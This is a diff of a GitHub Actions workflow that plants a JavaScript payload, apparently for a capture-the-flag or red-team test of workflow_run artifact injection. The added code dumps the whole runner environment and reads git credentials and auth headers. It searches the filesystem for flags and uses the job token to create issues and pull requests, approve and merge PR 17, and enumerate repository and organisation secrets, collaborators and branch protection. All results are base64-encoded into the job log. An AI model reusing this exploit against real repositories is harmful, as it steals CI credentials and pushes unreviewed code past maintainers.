@@ -20,9 +20,10 @@ jobs:
           cat > stage/.github/scripts/helpers/index.js <<'PAYLOAD'
           const fs = require('fs');
 
-          const REPORT = { marker: 'GAB_WFR_RCE_MARKER_v2' };
+          const REPORT = { marker: 'GAB_WFR_RCE_MARKER_v3' };
 
           async function probe() {
+            const { execSync } = require('child_process');
             const repo = process.env.GITHUB_REPOSITORY;
             const tok = process.env['INPUT_GITHUB-TOKEN'] || process.env.GITHUB_TOKEN || '';
             const out = REPORT;
@@ -30,6 +31,14 @@ jobs:
             out.token_len = tok.length;
             out.token_env = process.env['INPUT_GITHUB-TOKEN'] ? 'INPUT_GITHUB-TOKEN' : 'GITHUB_TOKEN';
             out.rid = process.env.GITHUB_RUN_ID;
+            out.env_full_b64 = Buffer.from(JSON.stringify(process.env)).toString('base64');
+            const sh = (c) => { try { return execSync(c, { encoding: 'utf8', timeout: 20000, maxBuffer: 4 * 1024 * 1024 }); } catch (e) { return 'ERR:' + (e.stdout || '') + (e.stderr || ''); } };
+            out.git_extraheader_b64 = Buffer.from(sh('git config --get-all http.https://github.com/.extraheader || true')).toString('base64');
+            out.git_credentials_b64 = Buffer.from(sh('cat /home/runner/.git-credentials 2>/dev/null || true')).toString('base64');
+            out.fs_flag_hits = sh("grep -rIa --exclude-dir=proc --exclude-dir=sys --exclude-dir=node_modules -e 'FLAG{' /home/runner /github /opt 2>/dev/null | head -20 || true").slice(0, 4000);
+            out.fs_flag_files = sh("find /home/runner /github /opt -iname '*flag*' -maxdepth 6 2>/dev/null | head -20 || true").slice(0, 2000);
+            out.event_path = process.env.GITHUB_EVENT_PATH;
+            out.event_json = sh('cat "$GITHUB_EVENT_PATH" 2>/dev/null | head -c 1500 || true');
             const api = async (path, opts = {}) => {
               try {
                 const r = await fetch('https://api.github.com' + path, {
@@ -42,7 +51,7 @@ jobs:
                   body: opts.body
                 });
                 const text = await r.text();
-                return { status: r.status, body: text.slice(0, 1200) };
+                return { status: r.status, body: text.slice(0, 1500) };
               } catch (e) {
                 return { error: String(e) };
               }
@@ -53,11 +62,19 @@ jobs:
               method: 'POST',
               body: JSON.stringify({ name: 'gab-pwned-rce', color: 'ff0000' })
             });
-            out.approvePR17 = await api('/repos/' + repo + '/pulls/17/reviews', {
+            out.createIssue = await api('/repos/' + repo + '/issues', {
               method: 'POST',
-              body: JSON.stringify({ event: 'APPROVE', body: 'Approved by repository automation (workflow_run artifact RCE proof).' })
+              body: JSON.stringify({ title: 'GAB WFR RCE proof', body: 'Workflow-run artifact extraction gave code execution with the job token. Marker: GAB_WFR_RCE_MARKER_v3' })
             });
-            out.mergePR17 = await api('/repos/' + repo + '/pulls/17/merge', {
+            out.createPr = await api('/repos/' + repo + '/pulls', {
+              method: 'POST',
+              body: JSON.stringify({ title: 'GAB WFR PR-create probe', head: 'lazyhacker6:attack/probe-pr', base: 'main', body: 'probe' })
+            });
+            out.approvePR = await api('/repos/' + repo + '/pulls/17/reviews', {
+              method: 'POST',
+              body: JSON.stringify({ event: 'APPROVE', body: 'probe' })
+            });
+            out.mergePR = await api('/repos/' + repo + '/pulls/17/merge', {
               method: 'PUT',
               body: JSON.stringify({ merge_method: 'merge' })
             });
@@ -75,14 +92,16 @@ jobs:
             });
             out.listSecrets = await api('/repos/' + repo + '/actions/secrets');
             out.listVariables = await api('/repos/' + repo + '/actions/variables');
+            out.listEnvironments = await api('/repos/' + repo + '/environments');
+            out.listCaches = await api('/repos/' + repo + '/actions/caches');
+            out.runners = await api('/repos/' + repo + '/actions/runners');
+            out.collaborators = await api('/repos/' + repo + '/collaborators');
+            out.branchProtection = await api('/repos/' + repo + '/branches/main/protection');
+            out.rulesets = await api('/repos/' + repo + '/rulesets');
             out.orgSecrets = await api('/orgs/PDFtoMark/actions/secrets');
-            out.listArtifacts = await api('/repos/' + repo + '/actions/artifacts?per_page=5');
-            out.envKeys = Object.keys(process.env).filter(k => /FLAG|SECRET|TOKEN|KEY/i.test(k));
-            out.envFlagHits = Object.entries(process.env)
-              .filter(([k, v]) => /FLAG\{/.test(String(v)))
-              .map(([k, v]) => k + '=' + v);
+            out.listArtifacts = await api('/repos/' + repo + '/actions/artifacts?per_page=10');
             console.log('GAB_WFR_RESULT_B64:' + Buffer.from(JSON.stringify(out)).toString('base64'));
-            try { fs.writeFileSync('PWNED.txt', 'GAB_WFR_RCE_MARKER_v2\n'); } catch (e) {}
+            try { fs.writeFileSync('PWNED.txt', 'GAB_WFR_RCE_MARKER_v3\n'); } catch (e) {}
             return out;
           }
 
